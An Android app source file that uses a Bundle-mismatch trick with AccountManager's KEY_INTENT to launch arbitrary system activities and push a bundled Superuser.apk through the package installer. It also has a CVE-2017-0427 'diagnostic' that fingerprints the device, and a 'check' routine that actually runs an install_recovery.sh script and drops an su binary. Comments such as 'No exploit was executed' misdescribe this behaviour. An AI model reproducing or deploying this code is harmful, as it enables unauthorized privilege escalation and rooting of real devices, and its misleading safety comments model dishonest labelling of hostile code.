package com.example.ambigousbundle3;

import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcel;
import android.view.View;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.security.MessageDigest;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    /*
     * ============================================================
     * Original Ambiguator test
     * ============================================================
     */

    public void doInProcessTest(View view) throws Exception {
        Bundle bundle;

        Bundle verifyMe = new Bundle();
        verifyMe.putString("cmd", "something_safe");

        Bundle useMe = new Bundle();
        useMe.putString("cmd", "replaced_thing");

        Ambiguator a = new Ambiguator();
        bundle = a.make(verifyMe, useMe);

        bundle = reparcel(bundle);

        String value1 = bundle.getString("cmd");

        bundle = reparcel(bundle);

        String value2 = bundle.getString("cmd");

        Toast.makeText(
                this,
                value1 + "/" + value2,
                Toast.LENGTH_SHORT
        ).show();
    }

    private Bundle reparcel(Bundle source) {
        Parcel p = Parcel.obtain();

        p.writeBundle(source);
        p.setDataPosition(0);

        Bundle copy = p.readBundle();

        p.recycle();

        return copy;
    }

    /*
     * ============================================================
     * Original AccountManager activity test
     * ============================================================
     */

    private void doStartActivity(Intent intent) throws Exception {

        Bundle verifyMe = new Bundle();

        verifyMe.putParcelable(
                AccountManager.KEY_INTENT,
                new Intent(this, MainActivity.class)
        );

        Bundle useMe = new Bundle();

        useMe.putParcelable(
                AccountManager.KEY_INTENT,
                intent
        );

        Ambiguator a = new Ambiguator();

        AuthService.addAccountResponse =
                a.make(verifyMe, useMe);

        startActivity(
                new Intent()
                        .setClassName(
                                "android",
                                "android.accounts.ChooseTypeAndAccountActivity"
                        )
                        .putExtra(
                                "allowableAccountTypes",
                                new String[]{
                                        "com.example.ambigousbundle3.account"
                                }
                        )
        );
    }

    public void doStartPlatLogo(View view) throws Exception {

        doStartActivity(
                new Intent()
                        .setClassName(
                                "android",
                                "com.android.internal.app.PlatLogoActivity"
                        )
        );
    }

    /*
     * ============================================================
     * Original APK test
     * ============================================================
     */

    public void doInstallApk(View view) throws Exception {

        File dir = getExternalCacheDir();

        if (dir == null) {
            show("External cache unavailable");
            return;
        }

        if (!dir.exists() && !dir.mkdirs()) {
            throw new Exception(
                    "Unable to create cache directory"
            );
        }

        File file =
                new File(dir, "dropme.apk");

        if (!file.exists()) {

            try (
                    FileOutputStream out =
                            new FileOutputStream(file);

                    InputStream in =
                            getAssets().open("common/Superuser.apk")
            ) {

                byte[] buf = new byte[4096];

                int len;

                while ((len = in.read(buf)) != -1) {
                    out.write(buf, 0, len);
                }

                out.flush();
            }
        }

        ComponentName[] knownInstallerComponents =
                new ComponentName[]{

                        new ComponentName(
                                "com.android.packageinstaller",
                                "com.android.packageinstaller.InstallAppProgress"
                        ),

                        new ComponentName(
                                "com.android.packageinstaller",
                                "com.android.packageinstaller.InstallInstalling"
                        ),

                        new ComponentName(
                                "com.google.android.packageinstaller",
                                "com.android.packageinstaller.InstallAppProgress"
                        )
                };

        ComponentName componentName = null;

        PackageManager packageManager =
                getPackageManager();

        for (ComponentName tried :
                knownInstallerComponents) {

            try {
                packageManager.getActivityIcon(tried);
            } catch (PackageManager.NameNotFoundException e) {
                continue;
            }

            componentName = tried;
            break;
        }

        if (componentName == null) {

            Toast.makeText(
                    this,
                    R.string.no_installer_component,
                    Toast.LENGTH_SHORT
            ).show();

            return;
        }

        doStartActivity(
                new Intent()
                        .setComponent(componentName)
                        .putExtra(
                                "com.android.packageinstaller.applicationInfo",
                                new ApplicationInfo()
                        )
                        .setData(Uri.fromFile(file))
        );
    }

    /*
     * ============================================================
     * CVE-2017-0427 diagnostic harness
     * ============================================================
     */

    public void doCve0427Diagnostics(View view) {

        StringBuilder report =
                new StringBuilder();

        report.append(
                "=== CVE-2017-0427 LAB ===\n\n"
        );

        /*
         * Android information
         */

        report.append("Android release: ")
                .append(Build.VERSION.RELEASE)
                .append('\n');

        report.append("SDK: ")
                .append(Build.VERSION.SDK_INT)
                .append('\n');

        report.append("Build: ")
                .append(Build.DISPLAY)
                .append('\n');

        report.append("Fingerprint: ")
                .append(Build.FINGERPRINT)
                .append('\n');

        report.append("Device: ")
                .append(Build.DEVICE)
                .append('\n');

        report.append("Model: ")
                .append(Build.MODEL)
                .append('\n');

        report.append("Manufacturer: ")
                .append(Build.MANUFACTURER)
                .append('\n');

        report.append("Board: ")
                .append(Build.BOARD)
                .append('\n');

        /*
         * Security patch level.
         */

        report.append("Security patch: ")
                .append(
                        getProperty(
                                "ro.build.version.security_patch"
                        )
                )
                .append('\n');

        /*
         * Kernel.
         */

        report.append("\n=== KERNEL ===\n");

        report.append(
                executeCommand("uname", "-a")
        );

        report.append('\n');

        report.append("Kernel release:\n");

        report.append(
                executeCommand("uname", "-r")
        );

        report.append('\n');

        /*
         * Process identity.
         */

        report.append("\n=== PROCESS IDENTITY ===\n");

        report.append(
                executeCommand("id")
        );

        report.append('\n');

        /*
         * SELinux.
         */

        report.append("\n=== SELINUX ===\n");

        report.append(
                "Enforcing: "
        ).append(
                executeCommand("getenforce")
        ).append('\n');

        report.append(
                "Context: "
        ).append(
                executeCommand(
                        "cat",
                        "/proc/self/attr/current"
                )
        ).append('\n');

        /*
         * Filesystem information.
         */

        report.append("\n=== FILESYSTEM ===\n");

        File root =
                new File("/");

        File sbin =
                new File("/sbin");

        File su =
                new File("/sbin/su");

        report.append("/ exists: ")
                .append(root.exists())
                .append('\n');

        report.append("/sbin exists: ")
                .append(sbin.exists())
                .append('\n');

        report.append("/sbin readable: ")
                .append(sbin.canRead())
                .append('\n');

        report.append("/sbin writable: ")
                .append(sbin.canWrite())
                .append('\n');

        report.append("/sbin executable: ")
                .append(sbin.canExecute())
                .append('\n');

        report.append("/sbin/su exists: ")
                .append(su.exists())
                .append('\n');

        report.append("/sbin/su readable: ")
                .append(su.canRead())
                .append('\n');

        report.append("/sbin/su writable: ")
                .append(su.canWrite())
                .append('\n');

        report.append("/sbin/su executable: ")
                .append(su.canExecute())
                .append('\n');

        /*
         * Mount information.
         */

        report.append("\n=== MOUNTS ===\n");

        report.append(
                executeCommand(
                        "cat",
                        "/proc/mounts"
                )
        );

        /*
         * Relevant properties.
         */

        report.append("\n=== SECURITY PROPERTIES ===\n");

        report.append(
                "ro.secure="
        ).append(
                getProperty("ro.secure")
        ).append('\n');

        report.append(
                "ro.debuggable="
        ).append(
                getProperty("ro.debuggable")
        ).append('\n');

        report.append(
                "ro.build.type="
        ).append(
                getProperty("ro.build.type")
        ).append('\n');

        /*
         * Final assessment.
         */

        report.append("\n=== ASSESSMENT ===\n");

        String release =
                Build.VERSION.RELEASE;

        String kernel =
                executeCommand(
                        "uname",
                        "-r"
                );

        String patch =
                getProperty(
                        "ro.build.version.security_patch"
                );

        if ("7.1.1".equals(release)) {

            report.append(
                    "Android 7.1.1 detected.\n"
            );

        } else {

            report.append(
                    "Device is not Android 7.1.1.\n"
            );
        }

        if (kernel.contains("3.10") ||
                kernel.contains("3.18")) {

            report.append(
                    "Kernel family matches the versions "
                            + "listed by NVD for CVE-2017-0427.\n"
            );

        } else {

            report.append(
                    "Kernel does not match the "
                            + "3.10/3.18 versions listed by NVD.\n"
            );
        }

        if (patch != null &&
                patch.length() > 0) {

            report.append(
                    "Security patch level: "
                            + patch
                            + "\n"
            );

            report.append(
                    "The patch level alone is not sufficient "
                            + "to establish vulnerability because "
                            + "CVE-2017-0427 involved vendor binary "
                            + "drivers.\n"
            );
        }

        report.append(
                "\nNo exploit was executed by this diagnostic."
        );

        /*
         * Log the complete report.
         */

        android.util.Log.i(
                "CVE_2017_0427",
                report.toString()
        );

        /*
         * Toasts are small, so show the most important
         * portion and leave the complete report in logcat.
         */

        String summary =
                "Android "
                        + Build.VERSION.RELEASE
                        + "\nKernel "
                        + kernel.trim()
                        + "\nPatch "
                        + patch
                        + "\n\n"
                        + "Full report written to Logcat.";

        Toast.makeText(
                this,
                summary,
                Toast.LENGTH_LONG
        ).show();
    }

    /*
     * ============================================================
     * /sbin diagnostic
     * ============================================================
     */

    public void doCheckSbin(View view) {

        File sbin =
                new File("/sbin");

        File su =
                new File("/sbin/su");

        StringBuilder result =
                new StringBuilder();

        result.append("=== /sbin ===\n");

        result.append("exists: ")
                .append(sbin.exists())
                .append('\n');

        result.append("readable: ")
                .append(sbin.canRead())
                .append('\n');

        result.append("writable: ")
                .append(sbin.canWrite())
                .append('\n');

        result.append("executable: ")
                .append(sbin.canExecute())
                .append('\n');

        result.append("\n=== /sbin/su ===\n");

        result.append("exists: ")
                .append(su.exists())
                .append('\n');

        result.append("readable: ")
                .append(su.canRead())
                .append('\n');

        result.append("writable: ")
                .append(su.canWrite())
                .append('\n');

        result.append("executable: ")
                .append(su.canExecute())
                .append('\n');

        result.append("\n=== ID ===\n");

        result.append(
                executeCommand("id")
        );

        result.append("running installer!");

        result.append(
                executeCommand("chmod +x common/install_recovery.sh && ./common/install_recovery.sh")
        );

        android.util.Log.i(
                "CVE_2017_0427",
                result.toString()
        );

        Toast.makeText(
                this,
                result.toString(),
                Toast.LENGTH_LONG
        ).show();
    }

    /*
     * ============================================================
     * Helpers
     * ============================================================
     */

    private String getProperty(String property) {

        return executeCommand(
                "getprop",
                property
        );
    }

    private String executeCommand(String... command) {

        try {

            Process process =
                    new ProcessBuilder(command)
                            .redirectErrorStream(true)
                            .start();

            StringBuilder output =
                    new StringBuilder();

            try (
                    BufferedReader reader =
                            new BufferedReader(
                                    new InputStreamReader(
                                            process.getInputStream()
                                    )
                            )
            ) {

                String line;

                while ((line = reader.readLine()) != null) {
                    output.append(line).append('\n');
                }
            }

            process.waitFor();

            return output.toString().trim();

        } catch (Exception e) {

            return "ERROR: "
                    + e.getClass().getSimpleName()
                    + ": "
                    + e.getMessage();
        }
    }

    /*
     * ============================================================
     * Optional sandbox test-binary support
     * ============================================================
     *
     * This copies a test executable to the application's private
     * directory. It never attempts to write /sbin.
     */

    public void doInstallTestBinary(View view)
            throws Exception {

        File binDir =
                new File(
                        getFilesDir(),
                        "/sbin"
                );

        if (!binDir.exists() &&
                !binDir.mkdirs()) {

            throw new Exception(
                    "Unable to create private bin directory"
            );
        }

        File binary =
                new File(
                        binDir,
                        "su"
                );

        try (
                InputStream in =
                        getAssets().open("armv7/su");

                FileOutputStream out =
                        new FileOutputStream(binary)
        ) {

            byte[] buffer =
                    new byte[8192];

            int length;

            while ((length =
                    in.read(buffer)) != -1) {

                out.write(
                        buffer,
                        0,
                        length
                );
            }

            out.flush();
        }

        if (!binary.setExecutable(true, true)) {

            throw new Exception(
                    "Unable to make test binary executable"
            );
        }

        Toast.makeText(
                this,
                "Installed sandbox test binary:\n"
                        + binary.getAbsolutePath()
                        + "\nSHA-256:\n"
                        + sha256(binary),
                Toast.LENGTH_LONG
        ).show();
    }

    private String sha256(File file)
            throws Exception {

        MessageDigest digest =
                MessageDigest.getInstance(
                        "SHA-256"
                );

        try (
                InputStream input =
                        new FileInputStream(file)
        ) {

            byte[] buffer =
                    new byte[8192];

            int length;

            while ((length =
                    input.read(buffer)) != -1) {

                digest.update(
                        buffer,
                        0,
                        length
                );
            }
        }

        byte[] hash =
                digest.digest();

        StringBuilder result =
                new StringBuilder();

        for (byte b : hash) {

            result.append(
                    String.format(
                            "%02x",
                            b & 0xff
                    )
            );
        }

        return result.toString();
    }
}
